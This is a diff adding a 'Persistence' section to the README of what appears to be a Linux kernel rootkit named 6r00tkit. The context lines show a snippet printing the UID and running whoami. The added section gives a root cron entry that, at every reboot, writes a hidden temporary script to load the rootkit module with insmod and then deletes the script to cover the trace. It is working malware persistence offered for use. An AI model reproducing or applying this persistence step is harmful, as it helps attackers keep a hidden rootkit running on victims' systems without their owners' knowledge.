@@ -62,6 +62,14 @@ print("Current UID:", getuid())
 system("whoami")
 ```
 
+## Persistence
+
+You can reload the kernel module on reboot with a single cronjob, write the following content in the filename `/etc/cron.d/6r00tkit`:
+
+```cron
+@reboot root /bin/bash -c 'echo "/bin/sleep 10; /sbin/insmod /path/to/6r00tkit.ko" > /tmp/.placeholder; /bin/bash /tmp/.placeholder; /bin/rm -f /tmp/.placeholder'
+```
+
 ## Licence
 
 Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
